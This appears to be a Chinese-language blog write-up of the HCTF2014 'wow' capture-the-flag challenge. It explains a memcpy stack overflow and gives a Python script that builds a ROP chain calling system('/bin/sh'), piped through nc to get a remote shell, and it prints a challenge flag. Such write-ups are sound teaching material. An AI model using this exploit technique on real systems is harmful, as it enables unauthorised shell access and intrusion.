---
layout: post
title: HCTF2014 wow writeup
catagories: [ctf]
tags: [ctf, writeup, hctf, xctf]
---
> wow的这一题的binary同时也是“真的能做吗”的binary.

这一题的问题，在分析wow这一题已经发现了，`memcpy()`函数产生溢出，
但`memcpy`函数的dst和src如果超过`0x30+0x8(rbp)+0x8(retaddr)`这么长，会产生dst和src重叠的问题
查上一下，`memcpy()`在处理重叠问题的时候会产生未知的效果，我也试了一下，它只
保留最终的`0x30+0x8+0x8`这些数据，前面的数据都会丢失，那也就是说，我们的可以利用的缓
冲区也就是从`ebp-0x30`到`retaddr`之间，直接改写，就改写了retaddr。

利用ROPGadget找到`pop rdi, ret`, 因为这题的libc是静态编译到wow的，所以可以找到`system()`
的地址，IDA里也可以搜索`/bin/sh`,万事俱备。

同时，由于需要绕过前面这个大循环，所以需要wow题的flag.此flag长度22,那么我们的栈大概是这样的布局

```
//memcpy之前
rip-0x30    wowflag
rip-0x28    wowflag+8
rip-0x20    wowflag+22+"AA"
rip-0x18    poprdi_gadget
rip-0x10    binsh_addr
rip-0x8     system_addr
rip         "B"*8
ret         pop3ret_addr
rip+0x8     xxx
rip+0x10    xxx
rip+0x10    xxx

//memcpy之后
rip-0x30    wowflag
rip-0x28    wowflag+8
rip-0x20    wowflag+22+"AA"
rip-0x18    poprdi_gadget
rip-0x10    binsh_addr
rip-0x8     system_addr
rip         "B"*8
ret         pop3ret_addr
rip+0x8     wowflag
rip+0x10    wowflag8
rip+0x18    wowflag22+"AA"
rip+0x20    poprdi_gadget
rip+0x28    binsh_addr
rip+0x30    system_addr
rip+0x38    "B"*8
rip+0x40    pop3ret_addr
...(以下每0x40字节重复)
```

因此生成shellcode的代码为：

```python
#!/usr/bin/env python2
from struct import pack

pad = "hctf{LJ_y6cdc_qweert!}"

libcbase = 0x00007FFFF75D3000

pop3    = 0x00007ffff75f35ad
poprdi  = 0x00007ffff75f59f2
system  = 0x00007FFFF7618310
binsh   = 0x00007FFFF774CFE7 

shellcode = ""
shellcode += pad 
shellcode += "A"*(24-len(pad)) 

shellcode += pack("<Q", poprdi)
shellcode += pack("<Q", binsh)
shellcode += pack("<Q", system)
shellcode += "B"*8

shellcode += pack("<Q", pop3)

fd = open("shellcodez", "w")
fd.write(shellcode)
fd.close()
```

输入`cat shellcodez -| nc addr port`拿到shell,flag在`/home/wow/`下
